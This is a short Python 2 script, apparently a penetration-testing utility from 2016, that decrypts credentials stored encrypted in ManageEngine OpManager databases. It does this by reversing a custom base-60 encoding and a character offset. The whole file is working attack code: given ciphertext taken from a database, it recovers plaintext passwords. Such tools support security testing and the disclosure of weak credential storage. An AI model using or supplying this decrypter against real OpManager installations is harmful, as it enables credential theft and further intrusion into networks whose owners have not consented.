#!/usr/bin/env python 

#
# Simple decrypter for encrypted credentials 
# stored in OpManager databases.
#
# Author: Denis Andzakovic
# Date: 28/01/2016
#


import sys

def main():
    if len(sys.argv) == 2:
        cipher_text = sys.argv[1]
    else:
        print "[!] Please provide a cipher text! - ./opmanager-decrypt.py <ciphertext>"
        exit(-1)

    decrypted = ""

    for i in split_by_n(base_converter(cipher_text), 2):
        decrypted += chr(int(i)+28)

    print decrypted[::-1]

def split_by_n(seq, n):
    while seq:
        yield seq[:n]
        seq = seq[n:]

def base_converter(encrypted):
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGIJKLMNOPQRSTUVWXY" # yes its missing an H and Z

    work = encrypted.replace("Z", "000")
    res = ""
    j = 0
    while j < len(work) / 6:
        s = ""
        chunk =  work[(6*j):(6*j+6)]

        for n in range (0,5):
            s += str(charset.index(chunk[n]))

        res += str(int(s)*60 + charset.index(chunk[5:]))
        j = j+1

    if len(work) % 6 != 0:
        s = ""
        if j >= 1:
            chunk = work[6*j:]

            for n in range (0,(len(chunk)-1)):
                s += str(charset.index(chunk[n]))

            res += str(int(s) * 60 + charset.index(chunk[n+1]))
                
    return res
    
if __name__ == '__main__':
    main()
